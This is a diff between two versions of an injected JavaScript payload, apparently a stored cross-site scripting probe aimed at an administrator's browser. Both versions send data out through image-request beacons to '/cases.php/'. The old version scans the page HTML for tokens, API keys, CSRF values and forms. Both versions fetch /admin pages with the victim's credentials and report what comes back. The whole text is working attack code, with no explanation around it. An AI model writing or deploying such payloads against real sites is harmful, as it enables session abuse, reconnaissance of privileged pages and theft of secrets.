@@ -1,12 +1,11 @@
-(function(){
- var R='R9478'; var b='/cases.php/'; var img=function(s){new Image().src=b+R+'_'+s+'.css';};
- try{
-  img('RAN');
-  var H=(document.documentElement&&document.documentElement.outerHTML)||'';
-  img('HOK_'+(H.length>0?1:0));
-  var L=''+H.length; for(var d=0;d<L.length;d++) img('HL'+d+'_'+L.charAt(d));
-  var kws=['action','<form','publish','seize','homepage','banner','upload','overwrite','notice','HLB2026','api_key','apikey','token','csrf','<button','/admin','textarea','contenteditable'];
-  kws.forEach(function(w,i){ if(H.indexOf(w)>=0) img('HAS'+i); });
-  ['/admin/index.php','/admin/review.php','/admin/search.php'].forEach(function(u,i){ fetch(u,{credentials:'include'}).then(function(r){img('AF'+i+'s'+r.status);}).catch(function(){img('AF'+i+'ERR');}); });
- }catch(e){ img('ERR'); }
+(function(){var b='/cases.php/D9588_';var img=function(s){new Image().src=b+s+'.css';};
+ img('1');
+ try{ img('2'); var d=document; img('3doc'+(d?1:0));
+   var de=d.documentElement; img('4de'+(de?1:0));
+   var H=de?de.outerHTML:''; img('5len'+(H.length>2000?'big':(H.length>200?'med':'small')));
+   img('6admin'+(H.indexOf('admin')>=0?1:0));
+   img('7loc'+(location.pathname.indexOf('review')>=0?'rev':(location.pathname.indexOf('admin')>=0?'adm':'other')));
+   img('8framed'+(window.top===window.self?'top':'iframe'));
+   fetch('/admin/index.php',{credentials:'include'}).then(function(r){img('9AF'+r.status);},function(){img('9AFrej');}).catch(function(){img('9AFerr');});
+ }catch(e){ img('EXC'+(e&&e.name||'x')); }
 })();
